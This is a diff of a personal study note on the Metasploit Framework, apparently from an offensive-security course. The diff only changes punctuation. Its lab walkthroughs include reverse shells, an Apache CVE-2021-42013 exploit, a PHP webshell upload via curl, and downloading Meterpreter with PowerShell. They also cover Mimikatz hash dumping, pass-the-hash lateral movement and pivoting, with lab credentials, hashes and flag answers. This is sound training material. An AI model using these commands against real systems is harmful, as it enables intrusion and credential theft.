@@ -1,8 +1,8 @@
 # The Metasploit Framework
 
-Module 21. Exploit framework that consolidates exploitation, payload delivery, post-exploitation, and session management into one consistent interface. Open-source, maintained by Rapid7, updated frequently. The goal isn't to memorise every module — it's to understand the mental model so you can find and run the right thing quickly.
+Module 21. Exploit framework that consolidates exploitation, payload delivery, post-exploitation, and session management into one consistent interface. Open-source, maintained by Rapid7, updated frequently. The goal isn't to memorise every module, it's to understand the mental model so you can find and run the right thing quickly.
 
-Cross-links: [[Using the Metasploit Framework (HTB Supplementary)]] — overlapping content there: db_nmap, search filter syntax, setg, session chaining, hashdump, named exploit walkthroughs.
+Cross-links: [[Using the Metasploit Framework (HTB Supplementary)]], overlapping content there: db_nmap, search filter syntax, setg, session chaining, hashdump, named exploit walkthroughs.
 
 ---
 
@@ -99,7 +99,7 @@ Q1: What command creates and initializes the MSF database?
 Q2: What is the command to display all services from discovered hosts with port 445?
 **Answer: `services -p 445`**
 
-> 🚩 Hands-on, VM spin-up required: 21.1.1 VM#1 — run `db_nmap -A <target>` in Metasploit, confirm `services -p 445` output ⬜ Pending
+> 🚩 Hands-on, VM spin-up required: 21.1.1 VM#1, run `db_nmap -A <target>` in Metasploit, confirm `services -p 445` output ⬜ Pending
 > **Note:** MSF PostgreSQL DB on this Kali install requires `sudo systemctl start postgresql` then `sudo msfdb reinit` before first use. DB is optional for most module functionality.
 
 ---
@@ -136,7 +136,7 @@ creds   # shows george:chocolate with host + service + type
 
 > 📸 Screenshot: `run` output showing `[+] Success: 'george:chocolate'` and session opening; `creds` showing stored result
 
-> ✅ 21.1.2 VM Group 1 — `ssh_login` brute-forced `george:chocolate` on BRUTE (192.168.249.201, port 2222); `sessions -i 1` → `cat ~/flag.txt` → `OS{5bcfcac837f98e3bb438a2e877d15255}`
+> ✅ 21.1.2 VM Group 1, `ssh_login` brute-forced `george:chocolate` on BRUTE (192.168.249.201, port 2222); `sessions -i 1` → `cat ~/flag.txt` → `OS{5bcfcac837f98e3bb438a2e877d15255}`
 
 ---
 
@@ -187,7 +187,7 @@ jobs                   # list active background jobs
 
 > 📸 Screenshot: `info` output showing side effects + reliability; `run` output showing session opening; `sessions -l` listing active session
 
-> ✅ 21.1.3 VM#1 — `apache_normalize_path_rce` (CVE-2021-42013) on 192.168.249.16 with `linux/x64/shell_reverse_tcp`; session opened; `pwd` = `/usr/bin`
+> ✅ 21.1.3 VM#1, `apache_normalize_path_rce` (CVE-2021-42013) on 192.168.249.16 with `linux/x64/shell_reverse_tcp`; session opened; `pwd` = `/usr/bin`
 
 ---
 
@@ -242,7 +242,7 @@ Q1: Which character denotes a staged payload in Metasploit?
 
 Q2: Find the 32-bit staged reverse TCP command shell for Linux in the apache_normalize_path_rce payload list.
 
-> ✅ 21.2.1 Q2 — `show payloads` on apache_normalize_path_rce confirmed: **`payload/linux/x86/shell/reverse_tcp`** (index 48, 32-bit staged reverse TCP shell for Linux)
+> ✅ 21.2.1 Q2, `show payloads` on apache_normalize_path_rce confirmed: **`payload/linux/x86/shell/reverse_tcp`** (index 48, 32-bit staged reverse TCP shell for Linux)
 
 ---
 
@@ -299,7 +299,7 @@ set payload linux/x64/meterpreter_reverse_https
 
 > 📸 Screenshot: `channel -l` showing two active shell channels; `channel -i 1` returning to first channel
 
-> ✅ 21.2.2 VM#1 — `meterpreter_reverse_https` on 192.168.249.16; `search -f passwords` found `/opt/passwords`; `cat /opt/passwords` → `OS{4b42685f18cb983a80cf8546b51d7177}`
+> ✅ 21.2.2 VM#1, `meterpreter_reverse_https` on 192.168.249.16; `search -f passwords` found `/opt/passwords`; `cat /opt/passwords` → `OS{4b42685f18cb983a80cf8546b51d7177}`
 
 ---
 
@@ -356,20 +356,20 @@ run -j   # run as background job, terminal stays free
 
 > 📸 Screenshot: `msfvenom` generating met.exe; `multi/handler` listener output; staged session opening with "Sending stage (336 bytes)"
 
-> 🔁 Similar to: [[Common Web Application Attacks#File Upload]] — the PHP webshell chain in 21.2.3 VM#2 is the same technique covered in that module: upload bypass (.pHP extension) + form field discovery via gobuster + curl trigger.
+> 🔁 Similar to: [[Common Web Application Attacks#File Upload]], the PHP webshell chain in 21.2.3 VM#2 is the same technique covered in that module: upload bypass (.pHP extension) + form field discovery via gobuster + curl trigger.
 
 External resources:
-- [PayloadsAllTheThings — MSF Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Metasploit%20-%20Cheatsheet.md)
-- [HackTricks — MSF/msfvenom payload generation](https://github.com/HackTricks-wiki/hacktricks/blob/master/generic-methodologies-and-resources/reverse-shells/msfvenom.md)
+- [PayloadsAllTheThings. MSF Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Metasploit%20-%20Cheatsheet.md)
+- [HackTricks. MSF/msfvenom payload generation](https://github.com/HackTricks-wiki/hacktricks/blob/master/generic-methodologies-and-resources/reverse-shells/msfvenom.md)
 
 **Labs:**
 
 Q1: Command to list all payloads of msfvenom?
 **Answer: `msfvenom -l payloads`**
 
-> 🚩 Hands-on, VM spin-up required: 21.2.3 VM#1 — generate a staged Windows EXE with msfvenom, set up multi/handler, execute on BRUTE2 (RDP as justin), confirm session ⬜ Pending
+> 🚩 Hands-on, VM spin-up required: 21.2.3 VM#1, generate a staged Windows EXE with msfvenom, set up multi/handler, execute on BRUTE2 (RDP as justin), confirm session ⬜ Pending
 
-> ✅ 21.2.3 VM#2 — gobuster on 192.168.249.189 (`/usr/share/wfuzz/wordlist/general/megabeast.txt`) found `/meteor/` → `/meteor/upload.php` (field: `fileToUpload`); `msfvenom -p php/reverse_php LHOST=... LPORT=4444 -f raw -o shell.pHP`; `curl -F "fileToUpload=@shell.pHP"`; triggered via `/meteor/uploads/shell.pHP`; `nc -nvlp 4444` caught `nt authority\system`; `type C:\xampp\passwords.txt` → `OS{8eda7505647594f1fef9b66ed8974b06}`
+> ✅ 21.2.3 VM#2, gobuster on 192.168.249.189 (`/usr/share/wfuzz/wordlist/general/megabeast.txt`) found `/meteor/` → `/meteor/upload.php` (field: `fileToUpload`); `msfvenom -p php/reverse_php LHOST=... LPORT=4444 -f raw -o shell.pHP`; `curl -F "fileToUpload=@shell.pHP"`; triggered via `/meteor/uploads/shell.pHP`; `nc -nvlp 4444` caught `nt authority\system`; `type C:\xampp\passwords.txt` → `OS{8eda7505647594f1fef9b66ed8974b06}`
 
 ---
 
@@ -418,7 +418,7 @@ migrate <new PID>
 
 > 📸 Screenshot: `ps` output showing met.exe alongside legitimate processes; `migrate` output showing success; `getuid` confirming new user context
 
-> ✅ 21.3.1 VM#1 — ITWK01 (192.168.249.223) bind shell port 4444 → PowerShell `iwr` to download met.exe → Meterpreter session → `getsystem` (Named Pipe Impersonation PrintSpooler) → `ps` found OneDrive.exe PID 6012 (ITWK01\offsec) → `migrate 6012` → `getenv Flag` → **`thisistheanswertothequestion`**
+> ✅ 21.3.1 VM#1. ITWK01 (192.168.249.223) bind shell port 4444 → PowerShell `iwr` to download met.exe → Meterpreter session → `getsystem` (Named Pipe Impersonation PrintSpooler) → `ps` found OneDrive.exe PID 6012 (ITWK01\offsec) → `migrate 6012` → `getenv Flag` → **`thisistheanswertothequestion`**
 
 ---
 
@@ -455,7 +455,7 @@ kiwi_cmd <cmd>     # raw Mimikatz command passthrough
 
 > 🔍 Worth remembering generally: `load kiwi` + `creds_msv` is the quickest path to NTLM hashes when you have SYSTEM. Saves the whole reg.exe save + smbserver + secretsdump pipeline.
 
-External resource: [HackTricks — Mimikatz / Kiwi inside Meterpreter](https://github.com/HackTricks-wiki/hacktricks/blob/master/windows-hardening/stealing-credentials/credentials-mimikatz.md)
+External resource: [HackTricks. Mimikatz / Kiwi inside Meterpreter](https://github.com/HackTricks-wiki/hacktricks/blob/master/windows-hardening/stealing-credentials/credentials-mimikatz.md)
 
 **Enumerating the Hosts file:**
 ```bash
@@ -468,9 +468,9 @@ run
 
 > 📸 Screenshot: `creds_msv` output showing Username, Domain, NTLM hash, SHA1 for local accounts
 
-> ✅ 21.3.2 VM#1 Q1 — bind shell → met.exe → `getsystem` → `load kiwi` → `creds_msv`; offsec NTLM: **`1c3fb240ae45a2dc5951a043cf47040e`**
+> ✅ 21.3.2 VM#1 Q1, bind shell → met.exe → `getsystem` → `load kiwi` → `creds_msv`; offsec NTLM: **`1c3fb240ae45a2dc5951a043cf47040e`**
 
-> ✅ 21.3.2 VM#1 Q2 — `search hostfile` → `post/windows/gather/enum_hostfile`; `set SESSION 1` → `run`; entry: `10.10.10.10  secretstaging-internal.com`; domain: **`secretstaging-internal.com`**
+> ✅ 21.3.2 VM#1 Q2, `search hostfile` → `post/windows/gather/enum_hostfile`; `set SESSION 1` → `run`; entry: `10.10.10.10  secretstaging-internal.com`; domain: **`secretstaging-internal.com`**
 
 ---
 
@@ -561,7 +561,7 @@ xfreerdp /v:127.0.0.1 /u:luiza   # connect directly, no proxychains
 
 > 📸 Screenshot: `route print` showing active route through session 12; autoroute module run output; proxychains xfreerdp RDP window on internal host
 
-> ✅ 21.3.3 VM Group 1 — ITWK01 (192.168.249.223) bind shell → met.exe → Meterpreter session 1 → `autoroute` added 172.16.249.0/24 → port scan confirmed ITWK02 (172.16.249.200) ports 445+3389 open → `psexec` as luiza:BoccieDearAeroMeow1! with `windows/x64/meterpreter/bind_tcp` LPORT=8000 → session 2 via session 1 → `cat C:\\Users\\luiza\\Desktop\\flag.txt` → `OS{9ebb0b404e4afd0431c9968644a7de45}`
+> ✅ 21.3.3 VM Group 1. ITWK01 (192.168.249.223) bind shell → met.exe → Meterpreter session 1 → `autoroute` added 172.16.249.0/24 → port scan confirmed ITWK02 (172.16.249.200) ports 445+3389 open → `psexec` as luiza:BoccieDearAeroMeow1! with `windows/x64/meterpreter/bind_tcp` LPORT=8000 → session 2 via session 1 → `cat C:\\Users\\luiza\\Desktop\\flag.txt` → `OS{9ebb0b404e4afd0431c9968644a7de45}`
 
 ---
 
@@ -616,15 +616,15 @@ Q1: What is the `msfconsole` command-line option to specify a resource script?
 
 Q2: What is the number of the first port scanned by portscan.rc?
 
-✅ **21.4.1 Q2** — Answer: **7**. The `ports` variable at the top of portscan.rc starts with: `"7,21,22,23,25,43,50,53,..."` — port 7 (Echo protocol) is first.
+✅ **21.4.1 Q2**. Answer: **7**. The `ports` variable at the top of portscan.rc starts with: `"7,21,22,23,25,43,50,53,..."`, port 7 (Echo protocol) is first.
 
-> 🚩 Hands-on, VM spin-up required: 21.4.1 VM#1 — use `listener.rc` resource script to set up multi/handler, get Meterpreter session from VM#1 ⬜ Pending
+> 🚩 Hands-on, VM spin-up required: 21.4.1 VM#1, use `listener.rc` resource script to set up multi/handler, get Meterpreter session from VM#1 ⬜ Pending
 
-✅ **21.4.1 Capstone VM Group 1** — Flag: `OS{05cf9f9964751cf5fd9d380efc330fb7}`
+✅ **21.4.1 Capstone VM Group 1**. Flag: `OS{05cf9f9964751cf5fd9d380efc330fb7}`
 
-> 🔧 Technique: **Apache NiFi unauthenticated RCE.** NiFi is a Java-based data flow tool common in enterprise data pipelines. Older versions (pre-1.14 without auth enforced) expose a REST API that lets anyone create an `ExecuteProcess` processor — essentially a scheduled task that runs an arbitrary OS command. No auth, no CVE, just a feature abused. MSF module: `exploit/multi/http/apache_nifi_processor_rce`. Always `set SSL false` when connecting to a plain HTTP NiFi instance — the module defaults to SSL and fails with a TLS handshake error.
+> 🔧 Technique: **Apache NiFi unauthenticated RCE.** NiFi is a Java-based data flow tool common in enterprise data pipelines. Older versions (pre-1.14 without auth enforced) expose a REST API that lets anyone create an `ExecuteProcess` processor, essentially a scheduled task that runs an arbitrary OS command. No auth, no CVE, just a feature abused. MSF module: `exploit/multi/http/apache_nifi_processor_rce`. Always `set SSL false` when connecting to a plain HTTP NiFi instance, the module defaults to SSL and fails with a TLS handshake error.
 
-> 🔍 Worth remembering generally: When an MSF module fails with `SSL_connect wrong version number`, it's trying HTTPS against a plain HTTP service. `set SSL false` (with no `!` at the prompt — just set it) and re-run.
+> 🔍 Worth remembering generally: When an MSF module fails with `SSL_connect wrong version number`, it's trying HTTPS against a plain HTTP service. `set SSL false` (with no `!` at the prompt, just set it) and re-run.
 
 > 🔍 Worth remembering generally: **Credential reuse via hash naming convention.** `creds_msv` on VM#1 returned a local account called `itwk04admin`. The hostname in the name (`itwk04`) is the exact hostname of VM#2. This is a common pattern: admins create named service accounts on each machine with a matching password. Dump hashes, look for usernames that reference other hostnames, try PtH against those machines. No network-level pivoting needed when both hosts are on the same reachable subnet.
 
@@ -641,12 +641,12 @@ flowchart LR
 **VM#1 (192.168.249.225 — ITWK03):**
 - nmap found Apache NiFi 1.17.0 on port 8080 (Windows, no auth)
 - Used `exploit/multi/http/apache_nifi_processor_rce` with `cmd/windows/powershell_reverse_tcp` (SSL false, DELAY 20) to get a PowerShell session as `alex`
-- Downloaded `met.exe` via `iwr`, caught with `multi/handler` — Meterpreter session as `alex`
+- Downloaded `met.exe` via `iwr`, caught with `multi/handler`. Meterpreter session as `alex`
 - `getsystem` via Named Pipe Impersonation (PrintSpooler) → SYSTEM
 - `load kiwi` + `creds_msv` dumped three hashes including `itwk04admin` (NTLM: `445414c16b5689513d4ad8234391aacf`)
 
 **VM#2 (192.168.249.226 — ITWK04):**
-- Both VMs on same /24 — no network-level pivot needed, credential-based lateral movement
+- Both VMs on same /24, no network-level pivot needed, credential-based lateral movement
 - `exploit/windows/smb/psexec` with `itwk04admin` hash (PtH) → Meterpreter session 3 as SYSTEM
 - `type C:\Users\itwk04admin\Desktop\flag.txt` → `OS{05cf9f9964751cf5fd9d380efc330fb7}`
 
@@ -711,21 +711,21 @@ msfvenom -p PAYLOAD LHOST=IP LPORT=PORT -f FORMAT -o FILE
 ## Related Boxes
 
 **Direct MSF exploit module practice:**
-- HTB **Lame** — vsftpd/SMB `usermap_script` via MSF, classic intro to exploit modules
-- HTB **Legacy** — `ms08_067_netapi` MSF module, Meterpreter on XP
-- HTB **Blue** — `ms17_010_eternalblue` via MSF, Meterpreter post-exploitation with `hashdump`
+- HTB **Lame**, vsftpd/SMB `usermap_script` via MSF, classic intro to exploit modules
+- HTB **Legacy**, `ms08_067_netapi` MSF module, Meterpreter on XP
+- HTB **Blue**, `ms17_010_eternalblue` via MSF, Meterpreter post-exploitation with `hashdump`
 
 **msfvenom payload generation:**
-- HTB **Devel** — msfvenom ASPX payload + multi/handler, Windows IIS target
-- HTB **Jerry** — Tomcat WAR delivery chain (msfvenom `-f war`)
+- HTB **Devel**, msfvenom ASPX payload + multi/handler, Windows IIS target
+- HTB **Jerry**. Tomcat WAR delivery chain (msfvenom `-f war`)
 
 **Meterpreter post-exploitation (getsystem / migrate / Kiwi):**
-- HTB **Grandpa / Granny** — token impersonation → getsystem path, dated but classic
-- HTB **Optimum** — MSF Windows kernel exploit chain
+- HTB **Grandpa / Granny**, token impersonation → getsystem path, dated but classic
+- HTB **Optimum**. MSF Windows kernel exploit chain
 
 **Pivoting through Metasploit:**
-- HTB **Bastard** — post-exploitation pivoting; autoroute usage
-- PG **Astronaut** — multi-hop pivot chain, good autoroute + socks_proxy practice
+- HTB **Bastard**, post-exploitation pivoting; autoroute usage
+- PG **Astronaut**, multi-hop pivot chain, good autoroute + socks_proxy practice
 
 > Heavily signatured Meterpreter payloads are rarely bypassed in public HTB/PG free-tier labs since most don't run real AV. That evasion gap is covered in [[Antivirus Evasion]].
 
